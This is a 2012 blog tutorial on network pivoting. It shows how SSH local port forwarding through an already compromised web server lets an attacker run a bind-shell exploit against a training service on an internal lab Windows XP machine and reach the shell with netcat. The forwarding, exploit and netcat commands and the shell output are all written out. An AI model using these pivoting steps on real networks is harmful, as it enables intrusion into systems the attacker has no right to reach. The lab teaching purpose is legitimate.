---
layout: post
title: "Introduction to pivoting, Part 1: SSH"
date: 2012-10-06 18:10:26 -0400
comments: true
categories: howto hacking
redirect_from: /2012/10/introduction-to-pivoting-part-1-ssh.html
---

Pivoting is a technique that allows attackers to use a compromised system to attack other machines in the same network, or more devastatingly, machines in another network that the compromised machine has access to. There are several techniques that can be used to pivot deeper into the network, and I'll be describing some of them in the next few articles. I've found that this topic can be a bit confusing to beginners, and I hope that these articles will help clear things up. In this article, we'll look at pivoting with SSH.

<!--more-->

### The scenario

There are two networks, 192.168.81.0/24 and 192.168.63.0/24. Our attacking machine, and a web server that has access to the 192.168.63.0/24 network are located in the 192.168.81.0/24 network. Our target, a Windows XP SP2 machine, is located in the 192.168.63.0/24. Our attacking machine does not have direct access to it, but the web server does.

![](/images/2012-10-06/01.jpg)

We've already compromised the web server and obtained SSH access to it as the user webmaster. Our goal is to use the web server as our pivot and obtain a remote shell on the Windows XP machine.

### The exploit

The Windows XP machine runs a vulnerable service called Server-Strcpy on port 10000. Server-Strcpy is part of the [SecurityTube Exploit Research Megaprimer](http://www.securitytube.net/video/1399) series, and can be downloaded at [http://code.securitytube.net/Server-Strcpy.exe](http://code.securitytube.net/Server-Strcpy.exe). I've written a quick exploit for Server-Strcpy.exe that binds a shell on port 4444, and can be downloaded [here](https://gist.github.com/superkojiman/fcb256c4ca40da00ad9676efd07a161c).

### The attack

Since we have SSH access to the web server, we can use SSH port forwarding to use it as our pivot. We run the following command on our attacking machine: 

```
ssh -L 127.0.0.1:10000:192.168.63.142:10000 webmaster@192.168.81.181
```

This tells SSH that we want to forward connections to port 10000 on our machine to port 10000 on 192.168.63.141 (Windows XP) through 192.168.81.181 (web server).

Once we've authenticated and logged in to 192.168.81.181, we can verify that port 10000 is running on our machine: 

```
# netstat -antp | grep 10000
tcp        0      0 127.0.0.1:10000         0.0.0.0:*               LISTEN      8230/ssh
```

We're ready to run our exploit. Our exploit takes two arguments, the target's IP address and the port to connect to. Since we are pivoting our attack through the web server, we specify port 10000 on our own machine: 

```
# ./serverstrcpy.py 127.0.0.1 10000
[+] sending payload of length 1479
[+] done, check port 4444 on target
```

The exploit claims to be successful, and we can verify it by using netcat to connect to port 4444 on the target. Keep in mind that we do not have direct access to the target, so we have to use SSH's local port forwarding again. This time, we forward port 4444 on our machine to port 4444 on the target: 

```
ssh -L 127.0.0.1:4444:192.168.63.142:4444 webmaster@192.168.81.181
```

Now when we connect to port 4444 on our machine with netcat, we get a shell on the Windows XP machine: 

```
# nc -v 127.0.0.1 4444
localhost [127.0.0.1] 4444 (?) open
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
 
C:\WINDOWS\system32>ipconfig
ipconfig
 
Windows IP Configuration
 
 
Ethernet adapter Local Area Connection:
 
        Connection-specific DNS Suffix  . : localdomain
        IP Address. . . . . . . . . . . . : 192.168.63.142
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.63.2
 
C:\WINDOWS\system32>
```

We've successfully pivoted our attack through the web server and obtained a remote shell on the Windows XP machine on the internal network. That concludes the first part of this series of pivoting articles. In part 2, we'll look at using Proxychains to pivot our exploit and hack into the Windows XP machine. 

